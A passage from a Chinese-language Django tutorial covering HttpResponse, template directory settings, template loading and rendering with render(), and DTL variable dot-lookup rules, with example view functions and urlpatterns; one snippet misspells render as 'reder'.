    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26412;&#36136;&#19978;&#37117;&#35201;&#19968;&#20010;&#23383;&#31526;&#20018;&#65292;&#20063;&#23601;&#26159;&#35828;&#21482;&#33021;&#32473;HttpResponse&#26500;&#36896;&#20989;&#25968;&#25552;&#20379;&#20869;&#23481;&#23383;&#31526;&#20018;&#23601;&#21487;&#20197;&#20102;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21160;&#24577;&#29983;&#25104;&#23601;&#26159;&#22312;&#20869;&#23384;&#29983;&#25104;&#19968;&#20010;&#24453;&#36820;&#22238;&#32473;&#27983;&#35272;&#22120;&#31471;&#30340;HTML&#30340;&#23383;&#31526;&#20018;</span>
    <span style="color: #a0522d;">response</span> = HttpResponse(<span style="color: #8b2252;">'&lt;html&gt;&lt;body&gt;&lt;h1 style="color:red"&gt;{}&lt;/h1&gt;&lt;div&gt;{}&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;'</span>.<span style="color: #483d8b;">format</span>(title, content))
    <span style="color: #a020f0;">return</span> response

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">'admin/'</span>, admin.site.urls), <span style="color: #b22222;"># </span><span style="color: #b22222;">/admin/ &#36335;&#24452;&#23545;&#24212;&#65292;&#22810;&#32423;url&#22788;&#29702;</span>
    path(<span style="color: #8b2252;">''</span>, index), <span style="color: #b22222;">#  </span><span style="color: #b22222;">'/' =&gt; index &#20989;&#25968;&#65292; request&#23454;&#21442;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">path('index', index), # '/index' OK ; '/index/' Wrong</span>
    path(<span style="color: #8b2252;">'index/'</span>, index), <span style="color: #b22222;"># </span><span style="color: #b22222;">'/index' 301 '/index/'; '/index/' OK</span>
]
</pre>
</div>

<p>
创建文件 user/index.html
</p>
<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #a020f0;">!DOCTYPE</span> html&gt;
&lt;<span style="color: #0000ff;">html</span> <span style="color: #a0522d;">lang</span>=<span style="color: #8b2252;">"en"</span>&gt;
&lt;<span style="color: #0000ff;">head</span>&gt;
    &lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">charset</span>=<span style="color: #8b2252;">"UTF-8"</span>&gt;
    &lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"viewport"</span> <span style="color: #a0522d;">content</span>=<span style="color: #8b2252;">"width=device-width, initial-scale=1.0"</span>&gt;
    &lt;<span style="color: #0000ff;">title</span>&gt;<span style="font-weight: bold; text-decoration: underline;">&#39318;&#39029;&#27979;&#35797;&#25991;&#20214;</span>&lt;/<span style="color: #0000ff;">title</span>&gt;
&lt;/<span style="color: #0000ff;">head</span>&gt;
&lt;<span style="color: #0000ff;">body</span>&gt;
{content} &lt;<span style="color: #0000ff;">br</span>&gt; {p1} {p2}
{p1}
&lt;/<span style="color: #0000ff;">body</span>&gt;
&lt;/<span style="color: #0000ff;">html</span>&gt;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.contrib <span style="color: #a020f0;">import</span> admin
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path, re_path <span style="color: #b22222;">#</span><span style="color: #b22222;">url</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.shortcuts import HttpResponse #WSGI&#24555;&#25463;&#26041;&#27861;&#65292;&#36824;&#21487;&#20197;&#20174;django.http&#20013;&#23548;&#20837;</span>
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, HttpRequest, JsonResponse
<span style="color: #a020f0;">from</span> django.core.handlers.wsgi <span style="color: #a020f0;">import</span> WSGIRequest
<span style="color: #b22222;"># </span><span style="color: #b22222;">HttpRequest&#26159;&#29238;&#31867;&#65307;WSGIRequest&#26159;&#23376;&#31867;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">view&#20989;&#25968;, &#26681;&#25454;&#35831;&#27714;&#65292;&#36820;&#22238;&#30456;&#24212;&#30340;&#32467;&#26524;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">function-based view =&gt; FBV</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35201;&#27714;&#24517;&#39035;&#25552;&#20379;&#33267;&#23569;&#19968;&#20010;&#21442;&#25968;&#65292;&#31532;&#19968;&#20010;&#21442;&#25968;&#35299;&#20915;request&#27880;&#20837;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:WSGIRequest):
    <span style="color: #a0522d;">title</span> = <span style="color: #8b2252;">'&#26631;&#39064;&#27979;&#35797;'</span>
    <span style="color: #a0522d;">content</span> = <span style="color: #8b2252;">'&#36825;&#26159;&#20869;&#23481;'</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21709;&#24212;&#25253;&#25991;&#27491;&#25991;&#37096;&#20998;&#30340;&#23383;&#31526;&#20018;&#21487;&#20197;&#21160;&#24577;&#29983;&#25104;&#65292;&#20063;&#21487;&#20197;&#20174;&#25991;&#20214;&#20013;&#35835;&#21462;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26412;&#36136;&#19978;&#37117;&#35201;&#19968;&#20010;&#23383;&#31526;&#20018;&#65292;&#20063;&#23601;&#26159;&#35828;&#21482;&#33021;&#32473;HttpResponse&#26500;&#36896;&#20989;&#25968;&#25552;&#20379;&#20869;&#23481;&#23383;&#31526;&#20018;&#23601;&#21487;&#20197;&#20102;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21160;&#24577;&#29983;&#25104;&#23601;&#26159;&#22312;&#20869;&#23384;&#29983;&#25104;&#19968;&#20010;&#24453;&#36820;&#22238;&#32473;&#27983;&#35272;&#22120;&#31471;&#30340;HTML&#30340;&#23383;&#31526;&#20018;</span>
    <span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(r<span style="color: #8b2252;">'D:\project\pyproj\trae\blog10\user\index.html'</span>, encoding=<span style="color: #8b2252;">'utf-8'</span>) <span style="color: #a020f0;">as</span> f:
        <span style="color: #a0522d;">txt</span> = f.read()
        <span style="color: #a0522d;">txt</span> = txt.<span style="color: #483d8b;">format</span>(content=content, p1=123, p2=<span style="color: #8b2252;">'xyz'</span>)
        <span style="color: #483d8b;">print</span>(txt)
    <span style="color: #a0522d;">response</span> = HttpResponse(txt)
    <span style="color: #a020f0;">return</span> response

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">'admin/'</span>, admin.site.urls), <span style="color: #b22222;"># </span><span style="color: #b22222;">/admin/ &#36335;&#24452;&#23545;&#24212;&#65292;&#22810;&#32423;url&#22788;&#29702;</span>
    path(<span style="color: #8b2252;">''</span>, index), <span style="color: #b22222;">#  </span><span style="color: #b22222;">'/' =&gt; index &#20989;&#25968;&#65292; request&#23454;&#21442;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">path('index', index), # '/index' OK ; '/index/' Wrong</span>
    path(<span style="color: #8b2252;">'index/'</span>, index), <span style="color: #b22222;"># </span><span style="color: #b22222;">'/index' 301 '/index/'; '/index/' OK</span>
]
</pre>
</div>

<p>
封装成字典
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.contrib <span style="color: #a020f0;">import</span> admin
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path, re_path <span style="color: #b22222;">#</span><span style="color: #b22222;">url</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.shortcuts import HttpResponse #WSGI&#24555;&#25463;&#26041;&#27861;&#65292;&#36824;&#21487;&#20197;&#20174;django.http&#20013;&#23548;&#20837;</span>
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, HttpRequest, JsonResponse
<span style="color: #a020f0;">from</span> django.core.handlers.wsgi <span style="color: #a020f0;">import</span> WSGIRequest
<span style="color: #b22222;"># </span><span style="color: #b22222;">HttpRequest&#26159;&#29238;&#31867;&#65307;WSGIRequest&#26159;&#23376;&#31867;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">view&#20989;&#25968;, &#26681;&#25454;&#35831;&#27714;&#65292;&#36820;&#22238;&#30456;&#24212;&#30340;&#32467;&#26524;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">function-based view =&gt; FBV</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35201;&#27714;&#24517;&#39035;&#25552;&#20379;&#33267;&#23569;&#19968;&#20010;&#21442;&#25968;&#65292;&#31532;&#19968;&#20010;&#21442;&#25968;&#35299;&#20915;request&#27880;&#20837;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:WSGIRequest):
    <span style="color: #a0522d;">title</span> = <span style="color: #8b2252;">'&#26631;&#39064;&#27979;&#35797;'</span>

    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21709;&#24212;&#25253;&#25991;&#27491;&#25991;&#37096;&#20998;&#30340;&#23383;&#31526;&#20018;&#21487;&#20197;&#21160;&#24577;&#29983;&#25104;&#65292;&#20063;&#21487;&#20197;&#20174;&#25991;&#20214;&#20013;&#35835;&#21462;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26412;&#36136;&#19978;&#37117;&#35201;&#19968;&#20010;&#23383;&#31526;&#20018;&#65292;&#20063;&#23601;&#26159;&#35828;&#21482;&#33021;&#32473;HttpResponse&#26500;&#36896;&#20989;&#25968;&#25552;&#20379;&#20869;&#23481;&#23383;&#31526;&#20018;&#23601;&#21487;&#20197;&#20102;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21160;&#24577;&#29983;&#25104;&#23601;&#26159;&#22312;&#20869;&#23384;&#29983;&#25104;&#19968;&#20010;&#24453;&#36820;&#22238;&#32473;&#27983;&#35272;&#22120;&#31471;&#30340;HTML&#30340;&#23383;&#31526;&#20018;</span>
    <span style="color: #a0522d;">context</span> = {
        <span style="color: #8b2252;">'title'</span>: title,
        <span style="color: #8b2252;">'content'</span>: <span style="color: #8b2252;">'&#36825;&#26159;&#27491;&#25991;&#20869;&#23481;'</span>,
        <span style="color: #8b2252;">'p1'</span>: 123,
        <span style="color: #8b2252;">'p2'</span>: <span style="color: #8b2252;">'xyz'</span>
    }
    <span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(r<span style="color: #8b2252;">'D:\project\pyproj\trae\blog10\user\index.html'</span>, encoding=<span style="color: #8b2252;">'utf-8'</span>) <span style="color: #a020f0;">as</span> f:
        <span style="color: #a0522d;">txt</span> = f.read()
        <span style="color: #a0522d;">txt</span> = txt.<span style="color: #483d8b;">format</span>(**context) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#36825;&#23601;&#26159;&#27169;&#26495;&#21407;&#29702;</span>
        <span style="color: #483d8b;">print</span>(txt)
    <span style="color: #a0522d;">response</span> = HttpResponse(txt)
    <span style="color: #a020f0;">return</span> response
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25152;&#35859;&#30340;&#27169;&#26495;&#25216;&#26415;&#65292;&#26412;&#36136;&#19978;&#23601;&#26159;&#35835;&#21462;&#30456;&#24212;&#25991;&#20214;&#65292;&#25214;&#21040;&#22635;&#31354;&#35821;&#27861;&#65292;&#29992;&#20869;&#23481;&#23558;&#22635;&#31354;&#35821;&#27861;&#26367;&#25442;&#23436;&#20043;&#21518;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29983;&#25104;&#19968;&#20010;&#22823;&#23383;&#31526;&#20018;&#65292;&#23558;&#22823;&#23383;&#31526;&#20018;&#20132;&#32473;Response&#23545;&#35937;&#21464;&#25104;&#27491;&#25991;&#65292;&#25226;&#27491;&#25991;&#20877;&#36820;&#22238;&#32473;&#27983;&#35272;&#22120;&#31471;</span>

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">'admin/'</span>, admin.site.urls), <span style="color: #b22222;"># </span><span style="color: #b22222;">/admin/ &#36335;&#24452;&#23545;&#24212;&#65292;&#22810;&#32423;url&#22788;&#29702;</span>
    path(<span style="color: #8b2252;">''</span>, index), <span style="color: #b22222;">#  </span><span style="color: #b22222;">'/' =&gt; index &#20989;&#25968;&#65292; request&#23454;&#21442;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">path('index', index), # '/index' OK ; '/index/' Wrong</span>
    path(<span style="color: #8b2252;">'index/'</span>, index), <span style="color: #b22222;"># </span><span style="color: #b22222;">'/index' 301 '/index/'; '/index/' OK</span>
]
</pre>
</div>
</div>
</div>
<div id="outline-container-h:2a9d1d94-4532-4b87-81db-f3a89607fca3" class="outline-3">
<h3 id="h:2a9d1d94-4532-4b87-81db-f3a89607fca3">模板配置</h3>
<div class="outline-text-3" id="text-h:2a9d1d94-4532-4b87-81db-f3a89607fca3">
<p>
在blog/settings.py中，设置模板项目的路径
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__))) #&#36825;&#21477;&#35805;&#21462;&#39033;&#30446;&#26681;&#30446;&#24405;</span>
<span style="color: #a0522d;">BASE_DIR</span> = Path(__file__).resolve().parent.parent
<span style="color: #a0522d;">TEMPLATES</span> = [
    {
        <span style="color: #8b2252;">'BACKEND'</span>: <span style="color: #8b2252;">'django.template.backends.django.DjangoTemplates'</span>,
        <span style="color: #b22222;"># </span><span style="color: #b22222;">'DIRS': [os.path.abspath(os.path.join(BASE_DIR,'templates'))], #&#21046;&#23450;&#27169;&#26495;&#25991;&#20214;&#22841;&#36335;&#24452;</span>
        <span style="color: #8b2252;">'DIRS'</span>: [Path(BASE_DIR,<span style="color: #8b2252;">'templates'</span>)], <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21046;&#23450;&#27169;&#26495;&#25991;&#20214;&#22841;&#36335;&#24452;</span>
        <span style="color: #8b2252;">'APP_DIRS'</span>: <span style="color: #008b8b;">True</span>,
        <span style="color: #8b2252;">'OPTIONS'</span>: {
            <span style="color: #8b2252;">'context_processors'</span>: [
                <span style="color: #8b2252;">'django.template.context_processors.debug'</span>,
                <span style="color: #8b2252;">'django.template.context_processors.request'</span>,
                <span style="color: #8b2252;">'django.contrib.auth.context_processors.auth'</span>,
                <span style="color: #8b2252;">'django.contrib.messages.context_processors.messages'</span>,
            ],
        },
    },
]
</pre>
</div>

<ul class="org-ul">
<li>DIRS: 列表，定义模板文件的搜索路径顺序。os.path.join(BASE_DIR,'templates')即项目根目录下templates目录，请构建这个目录。
<ol class="org-ol">
<li>项目根目录中构建templates文件夹。模板文件目录</li>
</ol></li>
<li>APP_DIRS: 是否运行在每个已经安装的应用中查找模板。应用自己目录下游templates目录，例如： django/contrilb/admin/templates 。如果应用需要可分离、可重用，建议吧模板放到应用目录下</li>
<li>BASE_DIR: 是项目根目录， os.path.join(BASE_DIR,'templates') 就是在manage.py这一层建立一个目录templates。这个路径就是以后默认找模板的地方。</li>
</ul>

<p>
注意：这里必须给出DIRS, 'APP_DIRS'为True，所以Djiango会搜索所有注册App的模板路径，但是还不能找到我们定义的index.html，会报错TemplateDoesNotExist。
</p>
</div>
</div>
<div id="outline-container-h:fbd99f6a-e10a-4154-a886-d862825ae16f" class="outline-3">
<h3 id="h:fbd99f6a-e10a-4154-a886-d862825ae16f">模板渲染</h3>
<div class="outline-text-3" id="text-h:fbd99f6a-e10a-4154-a886-d862825ae16f">
</div>
<div id="outline-container-h:81a6213e-d339-4f53-ac3f-51a6d6baefb4" class="outline-4">
<h4 id="h:81a6213e-d339-4f53-ac3f-51a6d6baefb4">模板页</h4>
<div class="outline-text-4" id="text-h:81a6213e-d339-4f53-ac3f-51a6d6baefb4">
<p>
新建index.html放在 templates 目录下
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #a020f0;">!DOCTYPE</span> html&gt;
&lt;<span style="color: #0000ff;">html</span> <span style="color: #a0522d;">lang</span>=<span style="color: #8b2252;">"en"</span>&gt;
&lt;<span style="color: #0000ff;">head</span>&gt;
    &lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">charset</span>=<span style="color: #8b2252;">"UTF-8"</span>&gt;
    &lt;<span style="color: #0000ff;">title</span>&gt;<span style="font-weight: bold; text-decoration: underline;">Django web &#27169;&#26495;&#25216;&#26415;</span>&lt;/<span style="color: #0000ff;">title</span>&gt;
&lt;/<span style="color: #0000ff;">head</span>&gt;
&lt;<span style="color: #0000ff;">body</span>&gt;
&#25105;&#26159;&#27169;&#26495;&#65292;&#25968;&#25454;&#26159;{{content}}
&lt;/<span style="color: #0000ff;">body</span>&gt;
&lt;/<span style="color: #0000ff;">html</span>&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:0c6c6c29-065c-46cb-b8fa-87db71b498ef" class="outline-4">
<h4 id="h:0c6c6c29-065c-46cb-b8fa-87db71b498ef">模板处理</h4>
<div class="outline-text-4" id="text-h:0c6c6c29-065c-46cb-b8fa-87db71b498ef">
<p>
2个步骤：
</p>
<ol class="org-ol">
<li>加载模板：模板是一个文件，需要从磁盘读取并加载。要将模板放置在指定的模板文件夹中</li>
<li>渲染：模板需要使用内容数据渲染，生成HTML文件内容</li>
<li>测试：修改blog/urls.py文件中的index函数。</li>
</ol>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:HttpRequest):
    <span style="color: #a020f0;">from</span> django.template <span style="color: #a020f0;">import</span> loader
    <span style="color: #a020f0;">from</span> django.template.backends.django <span style="color: #a020f0;">import</span> Template
    <span style="color: #a0522d;">t</span>:<span style="color: #228b22;">Template</span> = loader.get_template(<span style="color: #8b2252;">"index.html"</span>) <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21152;&#36733;&#22120;&#27169;&#22359;&#25628;&#32034;&#27169;&#26495;&#24182;&#21152;&#36733;&#23427;</span>
    <span style="color: #483d8b;">print</span>(t.origin, <span style="color: #483d8b;">type</span>(t)) <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26174;&#31034;&#27169;&#26495;&#36335;&#24452;, &#31867;&#22411;</span>
    <span style="color: #a0522d;">c</span> = {<span style="color: #8b2252;">"content"</span>:<span style="color: #8b2252;">"www.xdd.com"</span>} <span style="color: #b22222;">#</span><span style="color: #b22222;">&#23383;&#20856;&#25968;&#25454;</span>
    <span style="color: #a0522d;">text</span> = t.reder(c) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22635;&#31354;&#24471;&#21040;&#23383;&#31526;&#20018;</span>
    <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(text), text)
    <span style="color: #a020f0;">return</span> HttpResponse(text)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:377fab23-2d07-4e9b-be73-0a0e6e08934b" class="outline-4">
<h4 id="h:377fab23-2d07-4e9b-be73-0a0e6e08934b">render快捷渲染函数</h4>
<div class="outline-text-4" id="text-h:377fab23-2d07-4e9b-be73-0a0e6e08934b">
<p>
上面2个步骤代码编写繁琐，Django提供了对其的封装-------&#x2013;&#x2014;快捷函数render。
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">render</span>(
    request, template_name, context=<span style="color: #008b8b;">None</span>, content_type=<span style="color: #008b8b;">None</span>, status=<span style="color: #008b8b;">None</span>, using=<span style="color: #008b8b;">None</span>
):
    <span style="color: #8b2252;">"""</span>
<span style="color: #8b2252;">    Return an HttpResponse whose content is filled with the result of calling</span>
<span style="color: #8b2252;">    django.template.loader.render_to_string() with the passed arguments.</span>
<span style="color: #8b2252;">    """</span>
    <span style="color: #a0522d;">content</span> = loader.render_to_string(template_name, context, request, using=using)
    <span style="color: #a020f0;">return</span> HttpResponse(content, content_type, status)
</pre>
</div>
<ul class="org-ul">
<li>返回HTTPResponse对象</li>
<li>template_name #模板名称</li>
<li>context 数据字典</li>
<li>render_to_string()
是其核心方法，其实就是拿数据替换HTML中的指定位置后返回一个字符串</li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span>  render

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:HttpRequest):
    <span style="color: #8b2252;">"""&#35270;&#22270;&#20989;&#25968;&#65306;&#35831;&#27714;&#36827;&#26469;&#36820;&#22238;&#21709;&#24212;"""</span>
    <span style="color: #a020f0;">return</span> render(request,<span style="color: #8b2252;">"index.html"</span>,{<span style="color: #8b2252;">"content"</span>:<span style="color: #8b2252;">"www.xdd.com"</span>})
</pre>
</div>

<p>
范例：
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.contrib <span style="color: #a020f0;">import</span> admin
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path, re_path <span style="color: #b22222;">#</span><span style="color: #b22222;">url</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.shortcuts import HttpResponse #WSGI&#24555;&#25463;&#26041;&#27861;&#65292;&#36824;&#21487;&#20197;&#20174;django.http&#20013;&#23548;&#20837;</span>
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, HttpRequest, JsonResponse
<span style="color: #a020f0;">from</span> django.core.handlers.wsgi <span style="color: #a020f0;">import</span> WSGIRequest
<span style="color: #a020f0;">from</span> django.template.loader <span style="color: #a020f0;">import</span> get_template
<span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render
<span style="color: #b22222;"># </span><span style="color: #b22222;">HttpRequest&#26159;&#29238;&#31867;&#65307;WSGIRequest&#26159;&#23376;&#31867;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">view&#20989;&#25968;, &#26681;&#25454;&#35831;&#27714;&#65292;&#36820;&#22238;&#30456;&#24212;&#30340;&#32467;&#26524;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">function-based view =&gt; FBV</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35201;&#27714;&#24517;&#39035;&#25552;&#20379;&#33267;&#23569;&#19968;&#20010;&#21442;&#25968;&#65292;&#31532;&#19968;&#20010;&#21442;&#25968;&#35299;&#20915;request&#27880;&#20837;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:WSGIRequest):
    <span style="color: #a0522d;">title</span> = <span style="color: #8b2252;">'&#26631;&#39064;&#27979;&#35797;'</span>

    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21709;&#24212;&#25253;&#25991;&#27491;&#25991;&#37096;&#20998;&#30340;&#23383;&#31526;&#20018;&#21487;&#20197;&#21160;&#24577;&#29983;&#25104;&#65292;&#20063;&#21487;&#20197;&#20174;&#25991;&#20214;&#20013;&#35835;&#21462;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26412;&#36136;&#19978;&#37117;&#35201;&#19968;&#20010;&#23383;&#31526;&#20018;&#65292;&#20063;&#23601;&#26159;&#35828;&#21482;&#33021;&#32473;HttpResponse&#26500;&#36896;&#20989;&#25968;&#25552;&#20379;&#20869;&#23481;&#23383;&#31526;&#20018;&#23601;&#21487;&#20197;&#20102;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21160;&#24577;&#29983;&#25104;&#23601;&#26159;&#22312;&#20869;&#23384;&#29983;&#25104;&#19968;&#20010;&#24453;&#36820;&#22238;&#32473;&#27983;&#35272;&#22120;&#31471;&#30340;HTML&#30340;&#23383;&#31526;&#20018;</span>
    <span style="color: #a0522d;">context</span> = {
        <span style="color: #8b2252;">'title'</span>: title,
        <span style="color: #8b2252;">'content'</span>: <span style="color: #8b2252;">'&#36825;&#26159;&#27491;&#25991;&#20869;&#23481;'</span>,
        <span style="color: #8b2252;">'p1'</span>: 123,
        <span style="color: #8b2252;">'p2'</span>: <span style="color: #8b2252;">'xyz'</span>
    }
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21152;&#36733;&#27169;&#26495; --&gt; &#22635;&#31354;&#25340;&#25509;&#23383;&#31526;&#20018;&#20026;HTML --&gt; &#23553;&#35013;HTTPResponse&#23545;&#35937;&#36820;&#22238;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">from django.template.backends.django import Template</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">t:Template = get_template('index.html')</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">print(t.origin)</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">result = t.render(context)  #&#22635;&#31354;&#65292;&#36820;&#22238;&#30340;&#32467;&#26524;&#26159;&#37027;&#20010;HTML&#30340;&#22823;&#23383;&#31526;&#20018;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">print(type(result), result)</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">return HttpResponse(result)</span>
    <span style="color: #a020f0;">return</span> render(request, <span style="color: #8b2252;">'index.html'</span>, context, status=201)

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">'admin/'</span>, admin.site.urls), <span style="color: #b22222;"># </span><span style="color: #b22222;">/admin/ &#36335;&#24452;&#23545;&#24212;&#65292;&#22810;&#32423;url&#22788;&#29702;</span>
    path(<span style="color: #8b2252;">''</span>, index), <span style="color: #b22222;">#  </span><span style="color: #b22222;">'/' =&gt; index &#20989;&#25968;&#65292; request&#23454;&#21442;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">path('index', index), # '/index' OK ; '/index/' Wrong</span>
    path(<span style="color: #8b2252;">'index/'</span>, index), <span style="color: #b22222;"># </span><span style="color: #b22222;">'/index' 301 '/index/'; '/index/' OK</span>
]
</pre>
</div>

<ul class="org-ul">
<li>运行server <code>python manage.py runserver</code></li>
<li>访问 <a href="http://127.0.0.1:8000/">http://127.0.0.1:8000/</a></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:a6794a58-2021-4cf3-9116-80e8e3a5e254" class="outline-3">
<h3 id="h:a6794a58-2021-4cf3-9116-80e8e3a5e254">DTL语法(模板语法)</h3>
<div class="outline-text-3" id="text-h:a6794a58-2021-4cf3-9116-80e8e3a5e254">
</div>
<div id="outline-container-h:5f11a19c-280e-4b5c-bb1d-db609c3f5aaf" class="outline-4">
<h4 id="h:5f11a19c-280e-4b5c-bb1d-db609c3f5aaf">变量</h4>
<div class="outline-text-4" id="text-h:5f11a19c-280e-4b5c-bb1d-db609c3f5aaf">
<ul class="org-ul">
<li>语法： <code>{{ variable }}</code></li>
<li>变量名由字母、数字、下划线、点号组成。</li>
<li>点号使用的时候，例如foo.bar,遵循以下顺序：
<ol class="org-ol">
<li>字典查找，例如 foo["bar"], 把foo当做字典，bar当做key</li>

<li>属性或方法的查找，例如 foo.bar, 把foo当做对象，bar当做属性或方法</li>

<li>数字索引查找，例如 foo[bar] ,把foo当做列表一样，使用索引访问</li>
</ol></li>
</ul>

<p>
示例： 修改 blog/urls.py 文件中的index函数
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span>  render
<span style="color: #a020f0;">import</span> datetime

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:HttpRequest):
    <span style="color: #8b2252;">"""&#35270;&#22270;&#20989;&#25968;&#65306;&#35831;&#27714;&#36827;&#26469;&#36820;&#22238;&#21709;&#24212;"""</span>
    <span style="color: #a0522d;">my_dict</span> = {
        <span style="color: #8b2252;">"a"</span>:100,
        <span style="color: #8b2252;">"b"</span>:0,
        <span style="color: #8b2252;">"c"</span>:<span style="color: #483d8b;">list</span>(<span style="color: #483d8b;">range</span>(10,20)),
        <span style="color: #8b2252;">"d"</span>:<span style="color: #8b2252;">'abc'</span>,
        <span style="color: #8b2252;">"date"</span>:datetime.datetime.now()
    }
    <span style="color: #a0522d;">context</span> = {<span style="color: #8b2252;">"content"</span>:<span style="color: #8b2252;">"www.xdd.com"</span>,<span style="color: #8b2252;">"my_dict"</span>:my_dict}
    <span style="color: #a020f0;">return</span> render(request,<span style="color: #8b2252;">"index.html"</span>,context)
</pre>
</div>

<ul class="org-ul">
<li>如果 <b>变量未能找到，则缺省插入空字符串</b> 。</li>
<li>在 <b>模板中调用方法，不能加小括号</b> ，自然也不能传递参数。</li>
<li><code>{{my_dict.a}}</code> 复合第一条，当做字典的key就可以访问了</li>
<li><code>{{my_dict.keys}}</code> 正确写法。错误写法 <code>{{my_dict.keys()}}</code> 。符合第二条，当做my_dict对象的属性或方法。</li>
<li><code>{{ my_dict.c.0 }}</code> 符合第三条</li>
</ul>

<p>
范例：
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">blog/urls.py</span>
<span style="color: #a020f0;">from</span> django.contrib <span style="color: #a020f0;">import</span> admin
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path, re_path <span style="color: #b22222;">#</span><span style="color: #b22222;">url</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.shortcuts import HttpResponse #WSGI&#24555;&#25463;&#26041;&#27861;&#65292;&#36824;&#21487;&#20197;&#20174;django.http&#20013;&#23548;&#20837;</span>
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, HttpRequest, JsonResponse
<span style="color: #a020f0;">from</span> django.core.handlers.wsgi <span style="color: #a020f0;">import</span> WSGIRequest
<span style="color: #a020f0;">from</span> django.template.loader <span style="color: #a020f0;">import</span> get_template
<span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render
